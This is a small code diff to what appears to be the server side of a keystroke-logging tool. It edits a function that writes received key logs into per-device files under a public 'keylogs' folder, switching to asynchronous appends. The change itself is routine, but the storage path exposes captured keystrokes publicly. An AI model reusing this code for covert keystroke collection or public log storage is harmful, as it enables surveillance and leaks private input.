@@ -245,7 +245,7 @@ export const addNewKeyLogs = async (data: any) => {
 			};
 		}
 
-		// Create a username folder if it doesn't exist
+		// Create a directory for the device if it doesn't exist
 		const logsDir = path.join(__dirname, "../../public/keylogs", deviceId);
 		if (!fs.existsSync(logsDir)) {
 			fs.mkdirSync(logsDir, { recursive: true });
@@ -271,8 +271,13 @@ export const addNewKeyLogs = async (data: any) => {
 		// Create a buffer from the log entry string
 		const logBuffer = Buffer.from(logEntry, "utf-8");
 
-		// Append the buffer content to the file
-		fs.appendFileSync(filePath, logBuffer);
+		// Append the buffer content to the file asynchronously
+		await new Promise<void>((resolve, reject) => {
+			fs.appendFile(filePath, logBuffer, (err) => {
+				if (err) return reject(err);
+				resolve();
+			});
+		});
 	} catch (error) {
 		console.error("Error adding key logs:", error);
 		return { status: 500, error: "Failed to add key logs" };
